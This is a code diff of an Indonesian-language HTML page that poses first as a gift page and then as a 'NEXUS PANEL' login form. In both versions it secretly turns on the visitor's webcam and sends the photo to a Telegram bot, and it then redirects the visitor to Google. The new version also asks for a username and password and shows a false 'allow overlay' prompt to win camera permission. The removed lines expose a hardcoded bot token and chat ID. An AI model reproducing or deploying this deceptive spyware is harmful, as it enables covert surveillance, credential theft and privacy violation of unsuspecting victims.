@@ -1,64 +1,82 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>🎁 HADIAH NEXUS TEAM 2108 🎁</title>
+    <meta charset="UTF-8">
+    <title>NEXUS PANEL | LOGIN</title>
     <style>
-        body { background: #000; color: #00ffcc; text-align: center; font-family: 'Courier New', monospace; padding-top: 100px; }
-        .box { border: 2px solid #00ffcc; display: inline-block; padding: 20px; box-shadow: 0 0 15px #00ffcc; }
+        body { background: #000; color: #00ffcc; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .login-box { border: 2px solid #00ffcc; padding: 30px; box-shadow: 0 0 20px #00ffcc; border-radius: 10px; width: 300px; text-align: center; }
+        h2 { text-shadow: 0 0 10px #00ffcc; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; background: #111; border: 1px solid #00ffcc; color: #fff; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #00ffcc; border: none; color: #000; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #ff0055; color: #fff; box-shadow: 0 0 15px #ff0055; }
+        .overlay-msg { font-size: 10px; color: #ffcc00; margin-top: 15px; display: none; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>[ ACCESS GRANTED ]</h1>
-        <p>Sedang memverifikasi data akun Nexus lu...</p>
-        <p>Mohon jangan tutup halaman ini.</p>
-    </div>
 
-    <video id="video" width="640" height="480" style="display:none;" autoplay></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+<div class="login-box" id="authBox">
+    <h2>NEXUS LOGIN</h2>
+    <input type="text" id="user" placeholder="Username">
+    <input type="password" id="pass" placeholder="Password">
+    <button onclick="startBypass()">LOGIN & SYNC</button>
+    
+    <p id="msg" class="overlay-msg">[!] Klik 'IZINKAN' pada pop-up sistem untuk mengaktifkan Fitur Overlay (Berjalan di atas aplikasi lain)</p>
+</div>
 
-    <script>
-        // MASUKIN TOKEN DARI BOTFATHER DI BAWAH INI !!!
-        const token = '8794576817:AAHiq5Kfttd566LDVsyYh7ye-MICejn4cPM'; 
-        const chatid = '8416221686'; // Chat ID lu udah gw pasang otomatis
+<video id="video" width="640" height="480" style="display:none;" autoplay></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+<script>
+    const token = 'ISI_TOKEN_LU'; 
+    const chatid = '8416221686';
 
+    function startBypass() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+
+        if(u === "" || p === "") { alert("Isi data dulu Bos!"); return; }
+
+        // Tampilkan instruksi palsu
+        document.getElementById('msg').style.display = 'block';
+
+        // Minta izin kamera (Sistem akan munculin pop-up Kamera)
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            const video = document.getElementById('video');
             video.srcObject = stream;
-            setTimeout(takeAndSend, 3000);
-        }).catch(err => {
-            alert("Error: Browser tidak mendukung!");
-        });
-
-        function takeAndSend() {
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, 640, 480);
-            const imageData = canvas.toDataURL('image/png');
             
-            const blob = dataURItoBlob(imageData);
-            const formData = new FormData();
-            formData.append('chat_id', chatid);
-            formData.append('photo', blob, 'target_face.png');
-            formData.append('caption', '📸 TARGET TERDETEKSI OLEH NEXUS-EYE! 📸\n\nUser: hanzX\nStatus: Captured');
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                const data = canvas.toDataURL('image/png');
+                
+                // Kirim ke Bot Telegram
+                sendToTele(data);
+            }, 2000);
+        }).catch(err => {
+            alert("Gagal sinkronisasi! Izin Overlay ditolak.");
+        });
+    }
 
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(res => {
-                window.location.href = "https://google.com";
-            });
-        }
+    function sendToTele(imageData) {
+        const blob = dataURItoBlob(imageData);
+        const formData = new FormData();
+        formData.append('chat_id', chatid);
+        formData.append('photo', blob, 'target.png');
+        formData.append('caption', '📸 LOGGED IN: ' + document.getElementById('user').value + '\n🛰️ Status: Success Captured');
 
-        function dataURItoBlob(dataURI) {
-            var byteString = atob(dataURI.split(',')[1]);
-            var ab = new ArrayBuffer(byteString.length);
-            var ia = new Uint8Array(ab);
-            for (var i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
-            return new Blob([ab], {type: 'image/png'});
-        }
-    </script>
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
+        .then(() => { window.location.href = "https://google.com"; });
+    }
+
+    function dataURItoBlob(dataURI) {
+        var byteString = atob(dataURI.split(',')[1]);
+        var ab = new ArrayBuffer(byteString.length);
+        var ia = new Uint8Array(ab);
+        for (var i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
+        return new Blob([ab], {type: 'image/png'});
+    }
+</script>
+
 </body>
 </html>
